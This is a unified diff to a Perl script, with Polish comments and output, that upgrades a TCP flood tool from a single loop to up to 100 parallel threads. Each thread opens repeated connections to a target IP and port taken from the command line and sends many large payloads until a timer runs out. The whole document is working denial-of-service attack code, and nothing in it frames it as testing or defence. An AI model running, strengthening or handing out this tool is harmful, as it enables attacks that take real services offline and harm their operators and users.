@@ -1,26 +1,44 @@
 #!/usr/bin/perl
 
 use IO::Socket::INET;
+use threads;
 use strict;
 
-my ($ip, $port, $size, $time) = @ARGV;
+my ($ip, $port, $size, $time, $threads) = @ARGV;
+$size    ||= 4096;   # domyślny rozmiar pakietu
+$time    ||= 100;    # domyślny czas w sekundach
+$threads ||= 100;    # domyślna liczba wątków
 
-$size = $size || 1024;      # domyślny rozmiar pakietu
-$time = $time || 100;       # domyślny czas w sekundach
 my $endtime = time() + $time;
 
-print "TCP flood na $ip:$port przez $time sekund, pakiet: $size bajtów\n";
+print "\e[1;32m";
+print "TCP flood na $ip:$port przez $time sekund, pakiet: $size bajtów, wątki: $threads\n";
+print "\e[0m";
 
-for (; time() <= $endtime; ) {
-    my $sock = IO::Socket::INET->new(
-        PeerAddr => $ip,
-        PeerPort => $port,
-        Proto    => 'tcp',
-        Timeout  => 1
-    );
-    if ($sock) {
-        print $sock 'A' x $size;
-        close($sock);
+sub flood {
+    while (time() <= $endtime) {
+        my $sock = IO::Socket::INET->new(
+            PeerAddr => $ip,
+            PeerPort => $port,
+            Proto    => 'tcp',
+            Timeout  => 1
+        );
+        if ($sock) {
+            eval {
+                for (1..100) { # 100 pakietów na połączenie
+                    print $sock 'A' x $size;
+                }
+            };
+            close($sock);
+        }
     }
 }
-print "Koniec!\n";
+
+my @pool;
+for (1..$threads) {
+    push @pool, threads->create(\&flood);
+}
+
+$_->join for @pool;
+
+print "\e[1;32mKoniec!\e[0m\n";
